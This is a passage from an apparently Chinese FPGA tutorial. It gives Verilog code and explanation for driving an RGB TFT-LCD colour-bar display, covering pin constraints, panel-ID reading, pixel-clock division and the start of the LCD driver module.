set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN Y19 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports <span class="token punctuation">{<!-- --></span>lcd_rgb<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN P15 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports <span class="token punctuation">{<!-- --></span>lcd_rgb<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN P16 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports <span class="token punctuation">{<!-- --></span>lcd_rgb<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN V16 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports <span class="token punctuation">{<!-- --></span>lcd_rgb<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN W16 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports <span class="token punctuation">{<!-- --></span>lcd_rgb<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN T14 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports <span class="token punctuation">{<!-- --></span>lcd_rgb<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN T15 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports <span class="token punctuation">{<!-- --></span>lcd_rgb<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN Y17 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports <span class="token punctuation">{<!-- --></span>lcd_rgb<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN Y16 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports <span class="token punctuation">{<!-- --></span>lcd_rgb<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN T16 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports <span class="token punctuation">{<!-- --></span>lcd_rgb<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN U17 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports <span class="token punctuation">{<!-- --></span>lcd_rgb<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span>

set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN N18 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports lcd_hs<span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN T20 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports lcd_vs<span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN U20 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports lcd_de<span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN M20 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports lcd_bl<span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN P19 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports lcd_clk<span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN L17 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports lcd_rst<span class="token punctuation">]</span>
</code></pre> 
<p>18.4 程序设计<br> RGB TFT-LCD输入时序包含三个要素：像素时钟、同步信号、以及图像数据，由此我们可以大致规划出系统结构如下图所示。其中，读取ID模块用于获取LCD屏的ID；由于不同分辨率的屏幕需要不同的驱动时钟，因此时钟分频模块根据LCD ID来输出不同频率的像素时钟；LCD显示模块负责产生液晶屏上显示的数据，即彩条数据；LCD驱动模块根据LCD屏的ID，输出不同参数的时序，来驱动LCD屏，并将输入的彩条数据显示到LCD屏上。<br> <img src="https://images2.imgbox.com/65/23/8xGWuJYw_o.png" alt="在这里插入图片描述"></p> 
<p>图 7.5.13.1 RGB TFT-LCD彩条显示系统框图<br> 由系统框图可知，FPGA部分包括五个模块，顶层模块（lcd_rgb_colorbar）、读取ID模块（rd_id）、时钟分频模块（clk_div）、LCD显示模块（lcd_display）以及LCD驱动模块（lcd_driver）。其中在顶层模块中完成对其余模块的例化。<br> 各模块端口及信号连接如下图所示：<br> <img src="https://images2.imgbox.com/16/87/9ZikitR9_o.png" alt="在这里插入图片描述"></p> 
<p>图 7.5.13.2 顶层模块原理图<br> 读取ID模块（rd_id）在上电时将RGB双向数据总线设置为输入，来读取LCD屏的ID；时钟分频模块（clk_div）根据读取的ID来配置LCD的像素时钟；LCD驱动模块（lcd_driver）在像素时钟的驱动下输出数据使能信号用于数据同步，同时还输出像素点的纵横坐标，供LCD显示模块（lcd_display）调用，以绘制彩条图案。<br> 顶层模块lcd_rgb_colorbar的代码如下：</p> 
<pre><code class="prism language-c"><span class="token number">1</span>  module <span class="token function">lcd_rgb_colorbar</span><span class="token punctuation">(</span>
<span class="token number">2</span>      input                sys_clk<span class="token punctuation">,</span>     <span class="token comment">//系统时钟</span>
<span class="token number">3</span>      input                sys_rst_n<span class="token punctuation">,</span>   <span class="token comment">//系统复位</span>
<span class="token number">4</span>  
<span class="token number">5</span>      <span class="token comment">//RGB LCD接口</span>
<span class="token number">6</span>      output               lcd_de<span class="token punctuation">,</span>      <span class="token comment">//LCD 数据使能信号</span>
<span class="token number">7</span>      output               lcd_hs<span class="token punctuation">,</span>      <span class="token comment">//LCD 行同步信号</span>
<span class="token number">8</span>      output               lcd_vs<span class="token punctuation">,</span>      <span class="token comment">//LCD 场同步信号</span>
<span class="token number">9</span>      output               lcd_bl<span class="token punctuation">,</span>      <span class="token comment">//LCD 背光控制信号</span>
<span class="token number">10</span>     output               lcd_clk<span class="token punctuation">,</span>     <span class="token comment">//LCD 像素时钟</span>
<span class="token number">11</span>     output               lcd_rst<span class="token punctuation">,</span>     <span class="token comment">//LCD 复位</span>
<span class="token number">12</span>     inout        <span class="token punctuation">[</span><span class="token number">23</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>  lcd_rgb      <span class="token comment">//LCD RGB888颜色数据</span>
<span class="token number">13</span>     <span class="token punctuation">)</span><span class="token punctuation">;</span>                                                      
<span class="token number">14</span>     
<span class="token number">15</span> <span class="token comment">//wire define    </span>
<span class="token number">16</span> wire  <span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>  lcd_id    <span class="token punctuation">;</span>    <span class="token comment">//LCD屏ID</span>
<span class="token number">17</span> wire          lcd_pclk  <span class="token punctuation">;</span>    <span class="token comment">//LCD像素时钟</span>
<span class="token number">18</span>               
<span class="token number">19</span> wire  <span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>  pixel_xpos<span class="token punctuation">;</span>    <span class="token comment">//当前像素点横坐标</span>
<span class="token number">20</span> wire  <span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>  pixel_ypos<span class="token punctuation">;</span>    <span class="token comment">//当前像素点纵坐标</span>
<span class="token number">21</span> wire  <span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>  h_disp    <span class="token punctuation">;</span>    <span class="token comment">//LCD屏水平分辨率</span>
<span class="token number">22</span> wire  <span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>  v_disp    <span class="token punctuation">;</span>    <span class="token comment">//LCD屏垂直分辨率</span>
<span class="token number">23</span> wire  <span class="token punctuation">[</span><span class="token number">23</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>  pixel_data<span class="token punctuation">;</span>    <span class="token comment">//像素数据</span>
<span class="token number">24</span> wire  <span class="token punctuation">[</span><span class="token number">23</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>  lcd_rgb_o <span class="token punctuation">;</span>    <span class="token comment">//输出的像素数据</span>
<span class="token number">25</span> wire  <span class="token punctuation">[</span><span class="token number">23</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>  lcd_rgb_i <span class="token punctuation">;</span>    <span class="token comment">//输入的像素数据</span>
<span class="token number">26</span> 
<span class="token number">27</span> <span class="token comment">//*****************************************************</span>
<span class="token number">28</span> <span class="token comment">//**                    main code</span>
<span class="token number">29</span> <span class="token comment">//*****************************************************</span>
<span class="token number">30</span> 
<span class="token number">31</span> <span class="token comment">//像素数据方向切换</span>
<span class="token number">32</span> assign lcd_rgb <span class="token operator">=</span> lcd_de <span class="token operator">?</span>  lcd_rgb_o <span class="token operator">:</span>  <span class="token punctuation">{<!-- --></span><span class="token number">24</span><span class="token punctuation">{<!-- --></span><span class="token number">1</span>'bz<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token number">33</span> assign lcd_rgb_i <span class="token operator">=</span> lcd_rgb<span class="token punctuation">;</span>
<span class="token number">34</span> 
<span class="token number">35</span> <span class="token comment">//读LCD ID模块</span>
<span class="token number">36</span> rd_id <span class="token function">u_rd_id</span><span class="token punctuation">(</span>
<span class="token number">37</span>     <span class="token punctuation">.</span><span class="token function">clk</span>          <span class="token punctuation">(</span>sys_clk  <span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">38</span>     <span class="token punctuation">.</span><span class="token function">rst_n</span>        <span class="token punctuation">(</span>sys_rst_n<span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">39</span>     <span class="token punctuation">.</span><span class="token function">lcd_rgb</span>      <span class="token punctuation">(</span>lcd_rgb_i<span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">40</span>     <span class="token punctuation">.</span><span class="token function">lcd_id</span>       <span class="token punctuation">(</span>lcd_id   <span class="token punctuation">)</span>
<span class="token number">41</span>     <span class="token punctuation">)</span><span class="token punctuation">;</span>    
<span class="token number">42</span> 
<span class="token number">43</span> <span class="token comment">//时钟分频模块    </span>
<span class="token number">44</span> clk_div <span class="token function">u_clk_div</span><span class="token punctuation">(</span>
<span class="token number">45</span>     <span class="token punctuation">.</span><span class="token function">clk</span>           <span class="token punctuation">(</span>sys_clk  <span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">46</span>     <span class="token punctuation">.</span><span class="token function">rst_n</span>         <span class="token punctuation">(</span>sys_rst_n<span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">47</span>     <span class="token punctuation">.</span><span class="token function">lcd_id</span>        <span class="token punctuation">(</span>lcd_id   <span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">48</span>     <span class="token punctuation">.</span><span class="token function">lcd_pclk</span>      <span class="token punctuation">(</span>lcd_pclk <span class="token punctuation">)</span>
<span class="token number">49</span>     <span class="token punctuation">)</span><span class="token punctuation">;</span>    
<span class="token number">50</span> 
<span class="token number">51</span> <span class="token comment">//LCD显示模块    </span>
<span class="token number">52</span> lcd_display <span class="token function">u_lcd_display</span><span class="token punctuation">(</span>
<span class="token number">53</span>     <span class="token punctuation">.</span><span class="token function">lcd_pclk</span>       <span class="token punctuation">(</span>lcd_pclk  <span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">54</span>     <span class="token punctuation">.</span><span class="token function">rst_n</span>          <span class="token punctuation">(</span>sys_rst_n <span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">55</span>     <span class="token punctuation">.</span><span class="token function">pixel_xpos</span>     <span class="token punctuation">(</span>pixel_xpos<span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">56</span>     <span class="token punctuation">.</span><span class="token function">pixel_ypos</span>     <span class="token punctuation">(</span>pixel_ypos<span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">57</span>     <span class="token punctuation">.</span><span class="token function">h_disp</span>         <span class="token punctuation">(</span>h_disp    <span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">58</span>     <span class="token punctuation">.</span><span class="token function">v_disp</span>         <span class="token punctuation">(</span>v_disp    <span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">59</span>     <span class="token punctuation">.</span><span class="token function">pixel_data</span>     <span class="token punctuation">(</span>pixel_data<span class="token punctuation">)</span>
<span class="token number">60</span>     <span class="token punctuation">)</span><span class="token punctuation">;</span>    
<span class="token number">61</span> 
<span class="token number">62</span> <span class="token comment">//LCD驱动模块</span>
<span class="token number">63</span> lcd_driver <span class="token function">u_lcd_driver</span><span class="token punctuation">(</span>
<span class="token number">64</span>     <span class="token punctuation">.</span><span class="token function">lcd_pclk</span>      <span class="token punctuation">(</span>lcd_pclk  <span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">65</span>     <span class="token punctuation">.</span><span class="token function">rst_n</span>         <span class="token punctuation">(</span>sys_rst_n <span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">66</span>     <span class="token punctuation">.</span><span class="token function">lcd_id</span>        <span class="token punctuation">(</span>lcd_id    <span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">67</span>     <span class="token punctuation">.</span><span class="token function">pixel_data</span>    <span class="token punctuation">(</span>pixel_data<span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">68</span>     <span class="token punctuation">.</span><span class="token function">pixel_xpos</span>    <span class="token punctuation">(</span>pixel_xpos<span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">69</span>     <span class="token punctuation">.</span><span class="token function">pixel_ypos</span>    <span class="token punctuation">(</span>pixel_ypos<span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">70</span>     <span class="token punctuation">.</span><span class="token function">h_disp</span>        <span class="token punctuation">(</span>h_disp    <span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">71</span>     <span class="token punctuation">.</span><span class="token function">v_disp</span>        <span class="token punctuation">(</span>v_disp    <span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">72</span> 
<span class="token number">73</span>     <span class="token punctuation">.</span><span class="token function">lcd_de</span>        <span class="token punctuation">(</span>lcd_de    <span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">74</span>     <span class="token punctuation">.</span><span class="token function">lcd_hs</span>        <span class="token punctuation">(</span>lcd_hs    <span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">75</span>     <span class="token punctuation">.</span><span class="token function">lcd_vs</span>        <span class="token punctuation">(</span>lcd_vs    <span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">76</span>     <span class="token punctuation">.</span><span class="token function">lcd_bl</span>        <span class="token punctuation">(</span>lcd_bl    <span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">77</span>     <span class="token punctuation">.</span><span class="token function">lcd_clk</span>       <span class="token punctuation">(</span>lcd_clk   <span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">78</span>     <span class="token punctuation">.</span><span class="token function">lcd_rst</span>       <span class="token punctuation">(</span>lcd_rst   <span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token number">79</span>     <span class="token punctuation">.</span><span class="token function">lcd_rgb</span>       <span class="token punctuation">(</span>lcd_rgb_o <span class="token punctuation">)</span>
<span class="token number">80</span>     <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token number">81</span> 
<span class="token number">82</span> endmodule
</code></pre> 
<p>顶层模块主要完成对其他模块的例化。这里需要重点注意第32行代码，由于lcd_rgb是24位的双向引脚，所以这里对双向引脚的方向做一个切换。当lcd_de信号为高电平时，此时输出的像素数据有效，将lcd_rgb的引脚方向切换成输出，并将LCD驱动模块输出的lcd_rgb_o（像素数据）连接至lcd_rgb引脚；当lcd_de信号为低电平时，此时输出的像素数据无效，将lcd_rgb的引脚方向切换成输入。代码中将高阻状态“Z”赋值给lcd_rgb的引脚，表示此时lcd_rgb的引脚电平由外围电路决定，此时可以读取lcd_rgb的引脚电平，从而获取到LCD屏的ID。<br> 读取ID模块的代码如下：</p> 
<pre><code class="prism language-c"><span class="token number">1</span>   module <span class="token function">rd_id</span><span class="token punctuation">(</span>
<span class="token number">2</span>       input                   clk    <span class="token punctuation">,</span>    <span class="token comment">//时钟</span>
<span class="token number">3</span>       input                   rst_n  <span class="token punctuation">,</span>    <span class="token comment">//复位，低电平有效</span>
<span class="token number">4</span>       input           <span class="token punctuation">[</span><span class="token number">23</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>  lcd_rgb<span class="token punctuation">,</span>    <span class="token comment">//RGB LCD像素数据,用于读取ID</span>
<span class="token number">5</span>       output   reg    <span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>  lcd_id      <span class="token comment">//LCD屏ID</span>
<span class="token number">6</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token number">7</span>   
<span class="token number">8</span>   <span class="token comment">//reg define</span>
<span class="token number">9</span>   reg            rd_flag<span class="token punctuation">;</span>                 <span class="token comment">//读ID标志</span>
<span class="token number">10</span>  
<span class="token number">11</span>  <span class="token comment">//*****************************************************</span>
<span class="token number">12</span>  <span class="token comment">//**                    main code</span>
<span class="token number">13</span>  <span class="token comment">//*****************************************************</span>
<span class="token number">14</span>  
<span class="token number">15</span>  <span class="token comment">//获取LCD ID   M2:B7  M1:G7  M0:R7</span>
<span class="token number">16</span>  always @<span class="token punctuation">(</span>posedge clk or negedge rst_n<span class="token punctuation">)</span> begin
<span class="token number">17</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>rst_n<span class="token punctuation">)</span> begin
<span class="token number">18</span>          rd_flag <span class="token operator">&lt;=</span> <span class="token number">1</span>'b0<span class="token punctuation">;</span>
<span class="token number">19</span>          lcd_id <span class="token operator">&lt;=</span> <span class="token number">16</span>'d0<span class="token punctuation">;</span>
<span class="token number">20</span>      end    
<span class="token number">21</span>      <span class="token keyword">else</span> begin
<span class="token number">22</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>rd_flag <span class="token operator">==</span> <span class="token number">1</span>'b0<span class="token punctuation">)</span> begin
<span class="token number">23</span>              rd_flag <span class="token operator">&lt;=</span> <span class="token number">1</span>'b1<span class="token punctuation">;</span> 
<span class="token number">24</span>              <span class="token keyword">case</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>lcd_rgb<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span>lcd_rgb<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">,</span>lcd_rgb<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token number">25</span>                  <span class="token number">3</span><span class="token string">'b000 : lcd_id &lt;= 16'</span>h4342<span class="token punctuation">;</span>    <span class="token comment">//4.3' RGB LCD  RES:480x272</span>
<span class="token number">26</span>                  <span class="token number">3</span><span class="token string">'b001 : lcd_id &lt;= 16'</span>h7084<span class="token punctuation">;</span>    <span class="token comment">//7'   RGB LCD  RES:800x480</span>
<span class="token number">27</span>                  <span class="token number">3</span><span class="token string">'b010 : lcd_id &lt;= 16'</span>h7016<span class="token punctuation">;</span>    <span class="token comment">//7'   RGB LCD  RES:1024x600</span>
<span class="token number">28</span>                  <span class="token number">3</span><span class="token string">'b100 : lcd_id &lt;= 16'</span>h4384<span class="token punctuation">;</span>    <span class="token comment">//4.3' RGB LCD  RES:800x480</span>
<span class="token number">29</span>                  <span class="token number">3</span><span class="token string">'b101 : lcd_id &lt;= 16'</span>h1018<span class="token punctuation">;</span>    <span class="token comment">//10'  RGB LCD  RES:1280x800</span>
<span class="token number">30</span>                  <span class="token keyword">default</span> <span class="token operator">:</span> lcd_id <span class="token operator">&lt;=</span> <span class="token number">16</span>'d0<span class="token punctuation">;</span>
<span class="token number">31</span>              endcase    
<span class="token number">32</span>          end
<span class="token number">33</span>      end    
<span class="token number">34</span>  end
<span class="token number">35</span>  
<span class="token number">36</span>  endmodule
</code></pre> 
<p>读取ID模块根据输入的lcd_rgb值来寄存LCD屏的ID。lcd_rgb[7]（B7）、lcd_rgb[15]（G7）和lcd_rgb[23]（R7）分别对应M2、M1和M0。尽管在顶层模块中，双向引脚lcd_rgb会根据lcd_de信号的高低电平来频繁的切换方向，但本模块实际上只在上电后获取了一次ID，通过rd_flag作为标志。当rd_flag等于0时，获取一次ID，并将rd_flag赋值为1；而当rd_flag等于1时，不再获取LCD屏的ID。<br> 除此之外，为了方便将LCD的ID和分辨率对应起来，这里对M2、M1和M0的值做了一个译码，如3’b000译码成16’h4342，表示当前连接的是4.3寸屏，分辨率为480*272。其它ID的译码请参考注释。<br> 分频模块的代码如下：</p> 
<pre><code class="prism language-c"><span class="token number">1</span>   module <span class="token function">clk_div</span><span class="token punctuation">(</span>
<span class="token number">2</span>       input               clk<span class="token punctuation">,</span>          <span class="token comment">//50Mhz</span>
<span class="token number">3</span>       input               rst_n<span class="token punctuation">,</span>
<span class="token number">4</span>       input       <span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>  lcd_id<span class="token punctuation">,</span>
<span class="token number">5</span>       output  reg         lcd_pclk
<span class="token number">6</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token number">7</span>   
<span class="token number">8</span>   reg          clk_25m<span class="token punctuation">;</span>
<span class="token number">9</span>   reg          clk_12_5m<span class="token punctuation">;</span>
<span class="token number">10</span>  reg          div_4_cnt<span class="token punctuation">;</span>
<span class="token number">11</span>  
<span class="token number">12</span>  <span class="token comment">//时钟2分频 输出25MHz时钟 </span>
<span class="token number">13</span>  always @<span class="token punctuation">(</span>posedge clk or negedge rst_n<span class="token punctuation">)</span> begin
<span class="token number">14</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>rst_n<span class="token punctuation">)</span>
<span class="token number">15</span>          clk_25m <span class="token operator">&lt;=</span> <span class="token number">1</span>'b0<span class="token punctuation">;</span>
<span class="token number">16</span>      <span class="token keyword">else</span> 
<span class="token number">17</span>          clk_25m <span class="token operator">&lt;=</span> <span class="token operator">~</span>clk_25m<span class="token punctuation">;</span>
<span class="token number">18</span>  end
<span class="token number">19</span>  
<span class="token number">20</span>  <span class="token comment">//时钟4分频 输出12.5MHz时钟 </span>
<span class="token number">21</span>  always @<span class="token punctuation">(</span>posedge clk or negedge rst_n<span class="token punctuation">)</span> begin
<span class="token number">22</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>rst_n<span class="token punctuation">)</span> begin
<span class="token number">23</span>          div_4_cnt <span class="token operator">&lt;=</span> <span class="token number">1</span>'b0<span class="token punctuation">;</span>
<span class="token number">24</span>          clk_12_5m <span class="token operator">&lt;=</span> <span class="token number">1</span>'b0<span class="token punctuation">;</span>
<span class="token number">25</span>      end    
<span class="token number">26</span>      <span class="token keyword">else</span> begin
<span class="token number">27</span>          div_4_cnt <span class="token operator">&lt;=</span> div_4_cnt <span class="token operator">+</span> <span class="token number">1</span>'b1<span class="token punctuation">;</span>
<span class="token number">28</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>div_4_cnt <span class="token operator">==</span> <span class="token number">1</span>'b1<span class="token punctuation">)</span>
<span class="token number">29</span>              clk_12_5m <span class="token operator">&lt;=</span> <span class="token operator">~</span>clk_12_5m<span class="token punctuation">;</span>
<span class="token number">30</span>      end        
<span class="token number">31</span>  end
<span class="token number">32</span>  
<span class="token number">33</span>  always @<span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> begin
<span class="token number">34</span>      <span class="token keyword">case</span><span class="token punctuation">(</span>lcd_id<span class="token punctuation">)</span>
<span class="token number">35</span>          <span class="token number">16</span>'h4342 <span class="token operator">:</span> lcd_pclk <span class="token operator">=</span> clk_12_5m<span class="token punctuation">;</span>
<span class="token number">36</span>          <span class="token number">16</span>'h7084 <span class="token operator">:</span> lcd_pclk <span class="token operator">=</span> clk_25m<span class="token punctuation">;</span>       
<span class="token number">37</span>          <span class="token number">16</span>'h7016 <span class="token operator">:</span> lcd_pclk <span class="token operator">=</span> clk<span class="token punctuation">;</span>
<span class="token number">38</span>          <span class="token number">16</span>'h4384 <span class="token operator">:</span> lcd_pclk <span class="token operator">=</span> clk_25m<span class="token punctuation">;</span>
<span class="token number">39</span>          <span class="token number">16</span>'h1018 <span class="token operator">:</span> lcd_pclk <span class="token operator">=</span> clk<span class="token punctuation">;</span>
<span class="token number">40</span>          <span class="token keyword">default</span> <span class="token operator">:</span>  lcd_pclk <span class="token operator">=</span> <span class="token number">1</span>'b0<span class="token punctuation">;</span>
<span class="token number">41</span>      endcase      
<span class="token number">42</span>  end
<span class="token number">43</span>  
<span class="token number">44</span>  endmodule
</code></pre> 
<p>分频模块根据输入的LCD ID对50Mhz时钟进行分频。由于不同分辨率的LCD屏需要的像素时钟频率不一样，因此分频模块根据输入的LCD ID，来输出不同频率的像素时钟lcd_pclk。需要说明的是，我们在本章简介部分向大家列出了一张表，表格里记录了不同分辨率的屏幕所需的像素时钟频率，为了方便编写分频的代码，我们这里没有严格按照表格里所要求的时钟频率进行输出，而是输出接近于表格所要求的时钟频率。例如10.1寸屏，分辨率1280<em>800，如果刷新率为60Hz的话，需要输出70Mhz的像素时钟，这个时钟频率是无法通过编写代码的方式来得到，而是必须使例化时钟模块MMCM/PLL IP核来得到。因此，对于分辨率为1280</em>800的10.1寸屏幕来说，我们输出的是50Mhz的像素时钟，当然大家使用的是10.1寸屏幕，也可以通过例化时钟模块的方式，来输出一个70Mhz的像素时钟。<br> 分频模块通过两个always语句，分别进行2分频和4分频，得到一个25Mhz的时钟和一个12.5Mhz的时钟，如代码中第12行至第31行代码所示。下面我们介绍下如何对输入的时钟进行四分频，也就是50Mhz的时钟四分频后，得到一个12.5Mhz的时钟，其实只需要分频后时钟的周期时原时钟的四倍即可，四分频的波形图如下图所示：<br> <img src="https://images2.imgbox.com/b3/52/n5SIMmXp_o.png" alt="在这里插入图片描述"></p> 
<p>图 7.5.13.3 时钟四分频<br> 上图中的div_4_cnt用于对系统时钟进行计数，四分频计数器只需要一位位宽，即0和1之间跳变。clk_12_5m高电平和低电平分别占用了两个时钟周期，共占用四个时钟周期，sys_clk的时钟频率为50Mhz，周期为20ns，因此clk_12_5m的时钟周期为80ns，时钟频率为12.5Mhz。<br> 在代码的第33行至第42行，通过组合逻辑根据LCD屏的ID选择输出不同频率的像素时钟。<br> LCD驱动模块的代码如下：</p> 
<pre><code class="prism language-c"><span class="token number">1</span>   module <span class="token function">lcd_driver</span><span class="token punctuation">(</span>
<span class="token number">2</span>       input                lcd_pclk<span class="token punctuation">,</span>    <span class="token comment">//时钟</span>
<span class="token number">3</span>       input                rst_n<span class="token punctuation">,</span>       <span class="token comment">//复位，低电平有效</span>
<span class="token number">4</span>       input        <span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>  lcd_id<span class="token punctuation">,</span>      <span class="token comment">//LCD屏ID</span>
<span class="token number">5</span>       input        <span class="token punctuation">[</span><span class="token number">23</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>  pixel_data<span class="token punctuation">,</span>  <span class="token comment">//像素数据</span>
<span class="token number">6</span>       output       <span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>  pixel_xpos<span class="token punctuation">,</span>  <span class="token comment">//当前像素点横坐标</span>
